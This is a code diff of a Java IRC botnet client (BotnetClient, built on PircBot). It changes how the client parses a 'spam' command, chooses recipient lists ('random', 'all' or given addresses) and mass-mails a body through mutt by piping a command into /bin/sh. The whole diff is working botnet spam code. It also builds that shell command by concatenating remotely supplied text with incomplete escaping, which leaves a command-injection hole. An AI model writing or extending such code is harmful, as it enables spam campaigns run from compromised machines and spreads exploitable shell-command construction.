@@ -100,21 +100,23 @@ public class BotnetClient extends PircBot {
 			//message = startMsgE.decryptMsg(message);
 			//System.out.println(message);
 			if (message.toLowerCase().startsWith("spam")) {
-				String[] parts = message.split(" ");
-				if (parts.length < 6) {
-					System.out.println("bad spam message");
+				String[] parts = message.split("'");
+				if (parts.length < 9) {
+					System.out.println("bad spam message: " + message);
 				} else {
 					String x = parts[1];
-					String y = parts[2];
-					String z = parts[3];
-					String subject = parts[4];
+					String y = parts[3];
+					String z = parts[5];
+					String subject = parts[7];
+					String emails = parts[8].trim();
+					
 					String[] to;
-					if (parts[5].toLowerCase().equals("random")) {
+					if (emails.toLowerCase().equals("random")) {
 						to = getEmails(RANDOM_EMAILS);
-					} else if (parts[5].toLowerCase().equals("all")) {
+					} else if (emails.toLowerCase().equals("all")) {
 						to = getEmails(EMAILS);
 					} else {
-						to = Arrays.copyOfRange(parts, 5, parts.length);
+						to = emails.split(" ");
 					}
 					String body = "";
 					try {
@@ -198,8 +200,8 @@ public class BotnetClient extends PircBot {
 				emails += " " + email;
 			}
 			
-			body = body.replace("\"", "\\\"").replace("\n", "\\n").replace("!", "\\!");
-			String emailCommand = "echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails;
+			body = body.replace("\"", "\\\"").replace("\n", "\\n").replace("'", "\"");
+			String emailCommand = "echo -e '" + body + "' | mutt -s \"" + subject + "\"" + emails;
 			Process p = r.exec("/bin/sh");
 			
 			PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
